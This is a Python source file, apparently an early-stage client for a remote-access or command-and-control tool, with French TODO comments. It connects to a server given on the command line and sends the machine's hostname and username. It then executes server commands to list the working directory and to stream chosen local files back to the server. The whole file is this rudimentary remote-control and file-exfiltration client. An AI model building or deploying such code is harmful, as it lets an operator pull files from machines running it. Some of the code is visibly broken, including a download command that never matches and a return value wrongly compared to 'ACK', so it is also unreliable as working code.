import socket
import sys
import os
import datetime


# TODO : Est-ce que tu peux faire de le manipuler comme dans celui de GoSec ?
# Genre à partir de serveur
BUFFER_SIZE = 4096  # Size of chunks to send for file transfers


def get_system_info():
    """
    Retrieve the current system's hostname and username.
    """

    hostname = socket.gethostname()
    username = os.getenv("USERNAME") or os.getenv("USER") or "Unknown"

    # TODO : supporter linux??
    # Pour system info c'est facile avec les variable env USER et NAME


    return hostname, username


def format_list_output():
    """
    Format the directory listing similar to Windows Powershell's ls
    """

    entries = []
    try:
        for entry in os.scandir():
            mode = "d" if entry.is_dir() else "-"
            size = entry.stat().st_size // 1024 # convert bytes to KB
            mod_time = datetime.datetime.fromtimestamp(
                entry.stat().st_mtime
            ).strftime("%Y-%m-%d %H:%M:%S")
            entries.append(f"{mode:1} {mod_time:19} {size:10} KB {entry.name}")

    except Exception as e:
        return f"ERROR: Unable to list files ({e})"
    
    return "\n".join(entries) if entries else "[Empty Directory]"


def send_file(client_socket, filename):
    """
    Send a file to the server in chunks
    """
    if not os.path.isfile(filename):
        client_socket.sendall(f"ERROR: File '{filename}' not found\n".encode())
        return
    
    try:
        client_socket.sendall(f"FILE_START {filename} {os.path.getsize(filename)}\n".encode())

        with open(filename, "rb") as file:
            while chunk := file.read(BUFFER_SIZE):
                client_socket.sendall(chunk)

        client_socket.sendall("FILE_END\n".encode())
        print(f"[+] File '{filename}' sent successfully")
    
    except Exception as e:
        print(f"ERROR: {str(e)}\n".encode())


def main():
    if len(sys.argv) != 3:
        print(f"Usage: {sys.argv[0]} <server_ip> <server_port>")
        sys.exit(1)

    server_ip = sys.argv[1]
    server_port = int(sys.argv[2])

    hostname, username = get_system_info()

    try:
        # Connect to the TCP server
        client_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        client_socket.connect((server_ip, server_port))

        # Send hostname and username
        response = client_socket.sendall(f"{hostname},{username}\n".encode())

        # Peut probablement enlever cela
        if response == "ACK":
            print("[+] Server acknowledged connection.")

        # Enter listening mode
        while True:
            command = client_socket.recv(1024).decode().strip()

            if not command:
                print("[-] Connection lost. Exiting")
                break

            print(f"[Server] {command}")

            command = command.lower()

            # TODO : send to handler function that redistribute
            # to differents functions than returns
            if command == "exit":
                print("[+] Server requested termination. Closing connection")
                break

            elif command.startswith("echo "):
                message = command[5:].strip()
                client_socket.sendall(f"Echo: {message}\n".encode())

            elif command == "ack":
                pass

            
            elif command == "list":
                files = format_list_output()
                client_socket.sendall(f"FILES\n{files}\nEND_FILES\n".encode())

            elif command == "download ":
                filename = command[9:].strip()
                send_file(client_socket, filename)

            else:
                client_socket.sendall(f"Unknown command: {command}\n".encode())


    except Exception as e:
        print(f"[-] Error : {e}")

    finally:
        client_socket.close()


if __name__ == '__main__':
    main()
    

